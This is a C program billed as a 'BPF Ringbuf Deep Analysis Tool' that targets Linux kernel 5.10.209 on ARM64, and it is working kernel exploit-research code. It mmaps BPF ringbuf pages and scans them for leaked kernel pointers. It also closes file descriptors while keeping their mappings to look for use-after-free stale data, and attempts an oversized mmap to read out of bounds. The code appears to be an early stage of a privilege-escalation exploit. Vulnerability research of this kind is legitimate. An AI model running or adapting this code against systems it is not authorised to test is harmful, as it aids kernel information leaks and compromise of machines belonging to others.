/*
 * BPF Ringbuf Deep Analysis Tool
 * Target: Kernel 5.10.209
 *
 * Ringbuf mmap succeeded - explore for info leak
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <fcntl.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF Instruction Macros */
#define BPF_RAW_INSN(OP, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = OP, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(0xbf, DST, SRC, 0, 0)

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(0xb7, DST, 0, 0, IMM)

#define BPF_LD_MAP_FD(DST, FD)         \
    BPF_RAW_INSN(0x18, DST, 1, 0, FD), \
        BPF_RAW_INSN(0x00, 0, 0, 0, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(0x63 | ((SIZE) & 0x18), DST, SRC, OFF, 0)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(0x62 | ((SIZE) & 0x18), DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(0x61 | ((SIZE) & 0x18), DST, SRC, OFF, 0)

#define BPF_EMIT_CALL(FUNC) \
    BPF_RAW_INSN(0x85, 0, 0, 0, FUNC)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(0x95, 0, 0, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(0x05 | ((OP) & 0xf0), DST, 0, OFF, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(0x07 | ((OP) & 0xf0), DST, 0, 0, IMM)

/* Sizes */
#define BPF_W 0x00
#define BPF_DW 0x18

/* Helpers */
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_output 130
#define BPF_FUNC_ringbuf_query 134

/* Registers */
#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_5 5
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_9 9
#define BPF_REG_10 10
#define BPF_REG_FP 10

int create_ringbuf(int size)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .key_size = 0,
        .value_size = 0,
        .max_entries = size,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int create_array_map(int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_socket_filter(struct bpf_insn *insns, int insn_cnt, char *log_buf, int log_size)
{
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)"GPL",
        .log_buf = (uint64_t)log_buf,
        .log_size = log_size,
        .log_level = log_buf ? 1 : 0,
    };
    return bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
}

void hexdump(const char *desc, void *addr, int len)
{
    int i;
    unsigned char *pc = (unsigned char *)addr;

    if (desc != NULL)
        printf("%s:\n", desc);

    for (i = 0; i < len; i++)
    {
        if ((i % 16) == 0)
        {
            if (i != 0)
                printf("\n");
            printf("  %04x: ", i);
        }
        printf("%02x ", pc[i]);
    }
    printf("\n");
}

int check_kernel_ptrs(void *buf, int size)
{
    uint64_t *ptr = (uint64_t *)buf;
    int count = size / 8;
    int found = 0;

    for (int i = 0; i < count; i++)
    {
        uint64_t val = ptr[i];
        if (val == 0)
            continue;

        // ARM64 kernel addresses
        if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL)
        {
            printf("  [!] KERNEL PTR at offset 0x%x: 0x%016lx\n", i * 8, val);
            found++;
        }
        // Possible kernel text segment
        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL)
        {
            printf("  [!] KERNEL TEXT at offset 0x%x: 0x%016lx\n", i * 8, val);
            found++;
        }
    }
    return found;
}

void analyze_ringbuf_header(void *ptr)
{
    printf("\n[*] Analyzing ringbuf header structure...\n");

    uint64_t *hdr = (uint64_t *)ptr;

    // First 64 bytes are typically the ringbuf header
    printf("  Header quad 0: 0x%016lx (consumer_pos?)\n", hdr[0]);
    printf("  Header quad 1: 0x%016lx (producer_pos?)\n", hdr[1]);
    printf("  Header quad 2: 0x%016lx\n", hdr[2]);
    printf("  Header quad 3: 0x%016lx\n", hdr[3]);
    printf("  Header quad 4: 0x%016lx\n", hdr[4]);
    printf("  Header quad 5: 0x%016lx\n", hdr[5]);
    printf("  Header quad 6: 0x%016lx\n", hdr[6]);
    printf("  Header quad 7: 0x%016lx\n", hdr[7]);
}

void test_ringbuf_sizes()
{
    printf("\n=== Testing Different Ringbuf Sizes ===\n");

    int sizes[] = {4096, 8192, 16384, 32768, 65536, 131072};

    for (int i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
    {
        int size = sizes[i];
        int fd = create_ringbuf(size);

        if (fd < 0)
        {
            printf("[-] Size %d: failed (%s)\n", size, strerror(errno));
            continue;
        }

        // Try to mmap different offsets
        // Consumer page is at offset 0
        void *consumer = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);

        // Producer page is at offset 4096 (PAGE_SIZE)
        void *producer = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 4096);

        // Data pages start at offset 8192 (2 * PAGE_SIZE)
        void *data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 8192);

        printf("[+] Size %d:\n", size);
        printf("    Consumer page: %s\n", consumer != MAP_FAILED ? "OK" : "FAIL");
        printf("    Producer page: %s\n", producer != MAP_FAILED ? "OK" : "FAIL");
        printf("    Data pages: %s\n", data != MAP_FAILED ? "OK" : "FAIL");

        if (consumer != MAP_FAILED)
        {
            int leaks = check_kernel_ptrs(consumer, 4096);
            if (leaks == 0)
            {
                // Check for any non-zero interesting patterns
                uint64_t *p = (uint64_t *)consumer;
                for (int j = 0; j < 512; j++)
                {
                    if (p[j] != 0 && p[j] != 0xdeadbeef)
                    {
                        printf("    Consumer[%d]: 0x%016lx\n", j, p[j]);
                        if (j > 5)
                            break;
                    }
                }
            }
            munmap(consumer, 4096);
        }

        if (producer != MAP_FAILED)
        {
            check_kernel_ptrs(producer, 4096);
            munmap(producer, 4096);
        }

        if (data != MAP_FAILED)
        {
            check_kernel_ptrs(data, size > 4096 ? 4096 : size);
            munmap(data, size);
        }

        close(fd);
    }
}

void test_ringbuf_after_use()
{
    printf("\n=== Testing Ringbuf After Write Operations ===\n");

    int rb_fd = create_ringbuf(4096 * 4);
    if (rb_fd < 0)
    {
        printf("[-] Failed to create ringbuf: %s\n", strerror(errno));
        return;
    }

    // Map all regions
    void *consumer = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 0);
    void *producer = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, rb_fd, 4096);
    void *data = mmap(NULL, 4096 * 4, PROT_READ | PROT_WRITE, MAP_SHARED, rb_fd, 8192);

    if (consumer == MAP_FAILED || producer == MAP_FAILED || data == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        goto cleanup;
    }

    printf("[+] Mapped consumer=%p producer=%p data=%p\n", consumer, producer, data);

    // Analyze initial state
    printf("\n[*] Initial state:\n");
    analyze_ringbuf_header(consumer);

    // Write some pattern to data area directly
    memset(data, 0x41, 256);

    // Check if anything leaked in the unmapped areas
    printf("\n[*] After write, checking for leaks:\n");
    hexdump("Data area (first 64 bytes)", data, 64);
    check_kernel_ptrs(consumer, 4096);
    check_kernel_ptrs(producer, 4096);

cleanup:
    if (consumer != MAP_FAILED)
        munmap(consumer, 4096);
    if (producer != MAP_FAILED)
        munmap(producer, 4096);
    if (data != MAP_FAILED)
        munmap(data, 4096 * 4);
    close(rb_fd);
}

void test_rapid_create_destroy()
{
    printf("\n=== Testing Rapid Create/Destroy for UAF ===\n");

    int fds[256];
    void *maps[256];
    int created = 0;

    // Rapidly create ringbufs
    for (int i = 0; i < 256; i++)
    {
        fds[i] = create_ringbuf(4096);
        if (fds[i] >= 0)
        {
            maps[i] = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fds[i], 0);
            created++;
        }
        else
        {
            fds[i] = -1;
            maps[i] = MAP_FAILED;
        }
    }

    printf("[+] Created %d ringbufs\n", created);

    // Close half while keeping mmaps
    int closed = 0;
    for (int i = 0; i < 256; i += 2)
    {
        if (fds[i] >= 0)
        {
            close(fds[i]);
            fds[i] = -1;
            closed++;
        }
    }

    printf("[*] Closed %d fds while keeping mmaps\n", closed);

    // Create new ringbufs in holes
    int reused = 0;
    for (int i = 0; i < 256; i += 2)
    {
        int new_fd = create_ringbuf(4096);
        if (new_fd >= 0)
        {
            fds[i] = new_fd;
            reused++;
        }
    }

    printf("[*] Created %d new ringbufs\n", reused);

    // Now check the kept mmaps for any interesting content
    printf("\n[*] Checking kept mmaps for stale data:\n");
    int leaks_found = 0;
    for (int i = 1; i < 256; i += 2)
    {
        if (maps[i] != MAP_FAILED)
        {
            int leaks = check_kernel_ptrs(maps[i], 4096);
            if (leaks > 0)
            {
                printf("    Map %d has %d potential leaks\n", i, leaks);
                leaks_found += leaks;
            }
        }
    }

    printf("[*] Total potential leaks: %d\n", leaks_found);

    // Cleanup
    for (int i = 0; i < 256; i++)
    {
        if (maps[i] != MAP_FAILED)
            munmap(maps[i], 4096);
        if (fds[i] >= 0)
            close(fds[i]);
    }
}

void test_oob_read_attempt()
{
    printf("\n=== Testing OOB Read via Large mmap ===\n");

    int rb_fd = create_ringbuf(4096);
    if (rb_fd < 0)
    {
        printf("[-] Failed to create ringbuf\n");
        return;
    }

    // Try to mmap more than allocated
    size_t large_size = 4096 * 16;
    void *large = mmap(NULL, large_size, PROT_READ, MAP_SHARED, rb_fd, 0);

    if (large == MAP_FAILED)
    {
        printf("[-] Large mmap failed: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] Large mmap succeeded: %p (size %zu)\n", large, large_size);

        // Try to read beyond the ringbuf size
        printf("\n[*] Scanning for kernel pointers in extended region:\n");
        for (int offset = 4096; offset < large_size; offset += 4096)
        {
            volatile char c = ((char *)large)[offset]; // Trigger fault if unmapped
            printf("    Offset 0x%x: accessible (0x%02x)\n", offset, (unsigned char)c);
            check_kernel_ptrs((char *)large + offset, 64);
        }

        munmap(large, large_size);
    }

    close(rb_fd);
}

int main()
{
    printf("================================================\n");
    printf(" BPF Ringbuf Deep Analysis Tool\n");
    printf(" Target: Kernel 5.10.209\n");
    printf("================================================\n");

    // Basic test
    int test_fd = create_ringbuf(4096);
    if (test_fd < 0)
    {
        printf("[-] Ringbuf not available: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Ringbuf available\n");
    close(test_fd);

    // Run all tests
    test_ringbuf_sizes();
    test_ringbuf_after_use();
    test_rapid_create_destroy();
    test_oob_read_attempt();

    printf("\n================================================\n");
    printf(" Analysis Complete\n");
    printf("================================================\n");

    return 0;
}
